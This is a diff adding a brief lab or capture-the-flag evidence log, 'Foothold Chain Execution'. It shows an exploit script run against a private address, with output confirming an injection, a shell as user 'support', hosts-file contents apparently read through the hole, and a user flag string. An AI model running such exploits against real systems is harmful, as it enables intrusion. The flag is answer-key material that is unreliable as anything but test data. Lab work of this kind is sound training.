@@ -1,0 +1,12 @@
+010 Foothold Chain Execution
+
+Date: 31/07/2026 | Time: 23:56:22
+
+Foothold evidence
+python exploit.py http://192.168.77.21:8080
+[+] health check ok                            
+[+] baseline ok
+[+] injection confirmed
+[+] running as: support
+[+] user flag: 127.0.0.1       localhost
+UBI{A6_USER_F2557845D2AABFDAEF146657}
